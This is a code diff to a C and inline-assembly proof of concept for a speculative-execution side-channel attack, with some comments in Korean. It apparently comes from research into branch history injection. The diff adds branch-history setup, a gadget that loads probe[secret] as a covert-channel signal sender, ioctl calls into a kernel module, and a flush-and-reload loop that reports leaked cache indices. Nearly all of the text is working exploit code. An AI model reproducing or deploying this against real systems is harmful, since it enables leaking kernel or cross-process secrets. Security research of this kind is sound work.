@@ -41,6 +41,7 @@
 
 my_snip(br_src_call,
     // BHB setup
+    BHB_SETUP(194, 0x10 - 2)
     "nop\n"
     "lfence\n"
     "addq $1536, %rcx\n" // rcx = &probe[3*256]
@@ -51,10 +52,11 @@ my_snip(br_src_call,
     "ret\n"
     )
 
+// signal sender in covert channel
 my_snip(sig_gadget,
-    //"movzbl (%rbx), %eax\n"  // movzbl (suffix l = 32 bit)을 사용하였기 때문에 eax로 load 해야 함.
-    "mov (%rcx), %rcx\n" //load probe[secret]
-    "syscall\n"   //syscall for context switch
+    // "movzbl (%rbx), %eax\n"  // movzbl (suffix l = 32 bit)을 사용하였기 때문에 eax로 load 해야 함.
+    "mov (%rcx), %rcx\n" // load probe[secret]
+    "syscall\n"   // syscall for context switch
     "ret\n"
     )
 
@@ -111,22 +113,25 @@ void flush_array(uint8_t* probe){
 struct ap_payload p;
 
 void set_brc_src_call_by_victim(void *args){
+    
     asm volatile(
         "call *%%rdx\n"
         :
         : "d"(br_src_addr),"b"(victim_dst_addr), "c"(args)
     );
 }
-
+// kernel은 probe[8*512] load, adversary는 probe[3*512] load
 void call_gadget(uint8_t *probe){
     p.fptr = set_brc_src_call_by_victim;
-    p.data = probe;
+    p.data = &probe[5 * 512];
     asm volatile(
         "call *%0\n"
         :
-        : "a"(SYS_ioctl) , "D" (fd_ap), "d" (AP_IOCTL_RUN),"S"(&p), //syscall (ioctl에 들어갈 인자)
-        "r"(br_src_addr), "b"(sig_gadget_addr),"c"(probe)
-
+        : "r"(br_src_addr),"a"(SYS_ioctl) , "D" (fd_ap), "S" (AP_IOCTL_RUN),"d"(&p), //syscall (ioctl에 들어갈 인자)
+         "b"(sig_gadget_addr),"c"(probe)
+        : "r8", "r11", "memory"
+        //: "rcx", "r11", "memory"  // 클로버 : asm 내부에서 호출/syscall하는 경우
+                    //  컴파일러가 레지스터 어쩌구 문제 발생 가능(syscal는 rcx, r11 덮어씀)
     );
 }
 
@@ -168,7 +173,8 @@ void reload(uint8_t* probe){
 }
 
 void run(uint8_t* probe){
-    for(int tries = 0; tries < 5000; tries++){
+    probe[3 *512] = 3;
+    for(int tries = 0; tries < 10000; tries++){
         flush_array(probe);
 
         call_gadget(probe);
@@ -176,6 +182,8 @@ void run(uint8_t* probe){
         reload(probe);
     }
     printf("cached index is %d\n",find_cached_index(result));
+    result[find_cached_index(result)] = -1;
+    printf("second cached index is %d\n", find_cached_index(result));
 }
 
 int main(void){
